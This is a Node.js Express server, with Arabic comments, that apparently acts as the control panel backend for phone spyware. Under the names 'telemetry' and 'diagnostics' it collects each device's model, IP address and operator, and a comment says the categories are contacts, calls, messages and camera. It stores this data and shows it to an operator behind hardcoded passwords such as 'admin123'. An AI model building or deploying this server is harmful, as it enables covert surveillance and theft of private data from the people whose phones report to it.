const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const session = require('express-session');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
    secret: 'dark-net-secret-key-2026',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false }
}));

// نظام قاعدة البيانات المحلية
function readDB() {
    if (!fs.existsSync(DB_FILE)) {
        const initialDB = { devices: {}, diagnostics: {} };
        fs.writeFileSync(DB_FILE, JSON.stringify(initialDB, null, 2));
        return initialDB;
    }
    try {
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (e) {
        return { devices: {}, diagnostics: {} };
    }
}

function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function cleanId(id) {
    if (!id) return '';
    return id.replace(/[^a-zA-Z0-9_-]/g, '_');
}

// حماية مسارات اللوحة
function requireAuth(req, res, next) {
    if (req.session && req.session.loggedIn) {
        return next();
    }
    res.status(401).json({ error: 'Unauthorized' });
}

// تسجيل الدخول
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    // كلمة المرور الافتراضية للوحة التحكم (يمكنك تغييرها)
    if (password === 'admin123' || password === 'admin') {
        req.session.loggedIn = true;
        return res.json({ ok: true });
    }
    res.status(401).json({ error: 'Wrong password' });
});

app.get('/api/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login.html');
});

// استقبال معلومات الأجهزة والاتصال (Telemetry)
app.post('/api/telemetry', (req, res) => {
    const data = req.body;
    const deviceId = cleanId(data.deviceId || data.id || 'unknown_device');
    
    const db = readDB();
    db.devices[deviceId] = {
        deviceId: deviceId,
        model: data.model || 'Unknown',
        battery: data.battery || 'N/A',
        operator: data.operator || 'N/A',
        ip: req.ip,
        lastSeen: new Date().toISOString(),
        status: 'online'
    };
    writeDB(db);
    res.json({ status: 'success' });
});

// استقبال البيانات حسب الأقسام (جهات اتصال، مكالمات، رسائل، كاميرا...)
app.post('/api/diagnostics/:category', (req, res) => {
    const category = req.params.category;
    const data = req.body;
    const deviceId = cleanId(data.deviceId || 'unknown_device');

    const db = readDB();
    if (!db.diagnostics[deviceId]) {
        db.diagnostics[deviceId] = {};
    }
    
    db.diagnostics[deviceId][category] = {
        timestamp: new Date().toISOString(),
        content: data.content || data
    };

    // تحديث وقت ظهور الجهاز
    if (db.devices[deviceId]) {
        db.devices[deviceId].lastSeen = new Date().toISOString();
        db.devices[deviceId].status = 'online';
    }

    writeDB(db);
    res.json({ status: 'saved', category: category });
});

// جلب قائمة الأجهزة المتصلة للوحة التحكم
app.get('/api/devices', requireAuth, (req, res) => {
    const db = readDB();
    res.json(db.devices || {});
});

// جلب بيانات قسم معين لجهاز محدد
app.get('/api/diagnostics/:deviceId/:category', requireAuth, (req, res) => {
    const deviceId = cleanId(req.params.deviceId);
    const category = req.params.category;
    
    const db = readDB();
    if (db.diagnostics[deviceId] && db.diagnostics[deviceId][category]) {
        return res.json(db.diagnostics[deviceId][category]);
    }
    res.json({ content: 'لا توجد بيانات متاحة لهذا القسم بعد.' });
});

// مسار حذف الجهاز (تم إضافته لحل مشكلة الزر في اللوحة)
app.delete('/api/devices/:deviceId', requireAuth, (req, res) => {
    const id = cleanId(req.params.deviceId);
    if (!id) return res.status(400).json({ error: 'Invalid deviceId' });
    
    const db = readDB();
    let deleted = false;
    if (db.devices[id]) {
        delete db.devices[id];
        deleted = true;
    }
    if (db.diagnostics[id]) {
        delete db.diagnostics[id];
        deleted = true;
    }
    
    if (deleted) {
        writeDB(db);
        return res.json({ ok: true });
    }
    res.status(404).json({ error: 'Device not found' });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
